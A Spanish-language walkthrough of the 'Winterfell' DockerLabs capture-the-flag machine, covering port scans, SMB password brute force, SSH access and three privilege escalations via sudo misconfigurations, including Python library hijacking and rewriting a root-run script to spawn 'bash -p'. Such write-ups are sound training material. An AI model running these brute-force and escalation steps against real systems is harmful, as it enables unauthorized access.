# Máquina Winterfell

Enlace a la máquina -> [Dockerlabs](https://mega.nz/file/Qaky0DoJ#AfyxhrLvz8n_Kxefe-61c5n81T9CqtGeU_Ybk5Xv0bA)

![imagen](https://github.com/user-attachments/assets/7c675fe8-f26f-4fcf-bed4-ec3efa1f1ada)

- **Nombre de la Máquina:** Winterfell
- **Sistema Operativo:** Linux
- **Dificultad:** Easy
- **Plataforma:** DockerLabs
- **Dirección IP:** 172.17.0.2
- **Vulnerabilidades Explotadas:**
  - **SMB Brute Force**
- **Escalada de Privilegios:**
  - Uso de permisos sudo con Python y Library Hijacking.
  - Exposición de credenciales en archivos accesibles.
  - Uso de un script con permisos sudo para obtener una shell como root.

## Reconocimiento y Enumeración
Comenzamos realizando un escaneo general con nmap sobre la IP de la máquina objetivo para identificar los puertos abiertos.

```bash
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oN escaneo.txt
```

![imagen](https://github.com/user-attachments/assets/d42ed633-04c9-4bd1-97ef-8a5e3ffb2a7d)

Nos muestra que los puertos 22, 80, 139 y 445 están abiertos. Realizamos un análisis más detallado para determinar qué servicios se están ejecutándose en los puertos.

```bash
sudo nmap -p 22,80,139,445 -sCV 172.17.0.2 -oN targeted.txt
```

![imagen](https://github.com/user-attachments/assets/3b46ac8d-48f8-48fb-b9c1-09bb75bb4eb1)

### Puerto 80 HTTP
Lanzamos un `whatweb` para ver que servicios corren en el http.

![imagen](https://github.com/user-attachments/assets/40bd02eb-28b7-4971-98c0-a29a360f079d)

Podemos observar tres nombres de usuarios posibles nada mas entrar en la web, así que los guardaremos en un archivo llamado names.txt

![imagen](https://github.com/user-attachments/assets/6ee9f3c1-5582-4431-a97b-42d49561e9ae)

```bash
nano names.txt
jon
Arya
Daenerys
```

Seguimos investigando haciendo fuerza bruta usando gobuster para tratar de encontrar directorios.

```bash
sudo gobuster dir -u 'http://172.17.0.2/' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x php,html,txt
```

![imagen](https://github.com/user-attachments/assets/2f62d610-bfa9-45f1-bd3a-adff678889e4)

Vemos que encontramos un directorio llamado `/dragon/` y dentro hay un archivo llamado `EpisodiosT1` el cuál contiene un texto que dice lo siguiente:

![imagen](https://github.com/user-attachments/assets/2af02080-b513-4d83-a16f-5257c89826f3)

```txt
Estos son todos los Episodios de la primera  temporada de Juego de tronos.
Tengo la barra espaciadora estropeada por lo que dejare los nombres sin espacios, perdonad las molestias

seacercaelinvierno
elcaminoreal
lordnieve
tullidosbastardosycosasrotas
elloboyelleon
unacoronadeoro
ganasomueres
porelladodelapunta
baelor
fuegoyhielo
```

Parecen ser posibles contraseñas así que me las guardaré en un txt llamado passwords.txt

### Puerto 445 SMB
Enumerando el servicio smb vemos que existe un recurso compartido llamado `shared`.

![imagen](https://github.com/user-attachments/assets/2856af9e-07e0-412e-8a7b-716563199339)

Realizo un ataque de fuerza bruta con los nombres y contraseñas enumeradas por si cabe la posibilidad de ue sean las credenciales para acceder a los recursos compartidos.

```bash
crackmapexec smb 172.17.0.2 -u names.txt -p passwords.txt
```

Resultado:
  - jon
  - seacercaelinvierno

Accedemos con el comando smblient, y nos descargamos el único archivo que existe.

```bash
smbclient -U 'jon' //172.17.0.2/shared
get proteccion_del_reino
```

![imagen](https://github.com/user-attachments/assets/91698fef-98d1-4382-bead-de8837b31c67)

![imagen](https://github.com/user-attachments/assets/b436fffe-b77a-41a8-95e4-67f515b61bfb)

El texto nos da una contraseña cifrada en base64, por lo que vamos a descifrarla:

```bash
echo 'aGlqb2RlbGFuaXN0ZXI=' | base64 -d
```

![imagen](https://github.com/user-attachments/assets/032a7f08-216a-44cc-bd3c-b6336fe1f1c6)

Ya tenemos unas credenciales para acceder vía ssh, así que probaremos.

```bash
ssh jon@172.17.0.2
hijodelanister
```

![imagen](https://github.com/user-attachments/assets/880c5493-234c-43f9-a8cb-c1f73e2045e4)

## Escalada de privilegios a `aria`
Una vez dentro somos `jon`, ejecutamos el comando `sudo -l` y vemos que podemos ejecutar con python3 el script /home/jon/.mensaje.py siendo usuario `aria`.

![imagen](https://github.com/user-attachments/assets/e482a219-3b43-4375-b7b8-c7fe3bf00ddf)

### Primera forma de escalar a `aria`.
Podemos hacer la escalada de varias maneras y una de ellas sería borrar el script y volver a crearlo pero con un comando para otorgarnos una bash.

```bash
rm .mensaje.py
nano .mensaje.py
```

```python
import os

os.system("/bin/bash")
```

Otorgamos permisos de ejecución con el comando `chmod +x .mensaje.py` y a continuación ejecutamos el script con el usuario `aria` y listo, abremos escalado al usuario `aria`.

```bash
sudo -u aria /usr/bin/python3 /home/jon/.mensaje.py
```

![imagen](https://github.com/user-attachments/assets/9cfe112c-ceef-41d8-ad80-f4e02cd5ef71)

### Segunda forma de escalar a `aria`.
La otra forma sería hacer un [Library Hijacking](https://deephacking.tech/path-hijacking-y-library-hijacking/) usando la librería hashlib de python ya que es la primera que se importa en el script.

![imagen](https://github.com/user-attachments/assets/798b969c-ff8b-496d-8bdc-c94ddd6f2322)

```html
Si nos fijamos, el primer sitio donde python comprueba de forma por defecto la existencia de la librería es en ' ', esto significa la ruta actual.
Por lo que simplemente vamos a crear un archivo que se llame hashlib.py en la ruta actual.
```

![imagen](https://github.com/user-attachments/assets/df634ba1-a786-49a5-acf6-0ed3d9d62aef)

```bash
nano hashlib.py
```

```python
import os

os.system("/bin/bash")
```

Y tan solo haciendo eso ya tendremos también la escalada al usuario `aria`.

![imagen](https://github.com/user-attachments/assets/bc669d3b-b54a-4374-8b5c-d337ff76ccba)

## Escalada de privilegios a `daenerys`
Haciendo `sudo -l` con `aria` vemos que tenemos permisos para ejecutar como el usuario `daenerys` los siguientes comandos:

```bash
(daenerys) NOPASSWD: /usr/bin/cat, /usr/bin/ls
```

![imagen](https://github.com/user-attachments/assets/4ee95d19-775a-4870-8c75-4dd0b2d9f6b5)

Podemos ejecutar el comando `ls -la` para ver ue hay en el directorio de `daenerys`, vemos que existe un archivo llamado `mensajeParaJon` y otro llamado `.secret`.

```bash
sudo -u daenerys /usr/bin/ls -la daenerys/
```

![imagen](https://github.com/user-attachments/assets/76465435-b57b-4436-a1db-d3e1815630ab)

Pues bastante fácil, el usuario `daenerys` expone su contraseña en el archivo `mensajeParaJon`.

```bash
sudo -u daenerys /usr/bin/cat daenerys/mensajeParaJon
```

![imagen](https://github.com/user-attachments/assets/d559596e-b6c4-41ca-ae28-a28a4c9d1289)

  - User: daenerys
  - Password: drakaris

![imagen](https://github.com/user-attachments/assets/d7569435-3722-4730-9494-fd87d6619d4e)

## Escalada de privilegios a Root
Ejecutando otra vez `sudo -l` pero con `daenerys`, tenemos permisos para ejecutar como root un script llamado `.shell.sh`.

```bash
(ALL) NOPASSWD: /usr/bin/bash /home/daenerys/.secret/.shell.sh
```

![imagen](https://github.com/user-attachments/assets/b59230f0-4962-4d63-b94b-c1ef1e56b2d3)

Bastante fácil también, vemos que tenemos permisos de lectura y escritura así que vamos a modificarlo, aparentemente es un script el cuál podemos mandarnos una reverse shell.

![imagen](https://github.com/user-attachments/assets/96b1f55f-0498-4987-accf-8ca7a946242f)

Lo modificaremos y pondremos lo siguiente:

```.shell.sh
#!/bin/bash

bash -p
```

Ahora cuando ejecutemos el script, como lo estaremos ejecutando como `root` lo que hará será otorgarnos una bash con privilegios.

```bash
sudo /usr/bin/bash /home/daenerys/.secret/.shell.sh
```

![imagen](https://github.com/user-attachments/assets/d7324a55-69ee-42ef-ae07-af06bd332b14)

Como podemos ver ya nos habríamos convertido en usuario root. Máquina muy chula en la que se puede aprender varios conceptos como la fuerza bruta y los distintos vectores de escaladas.
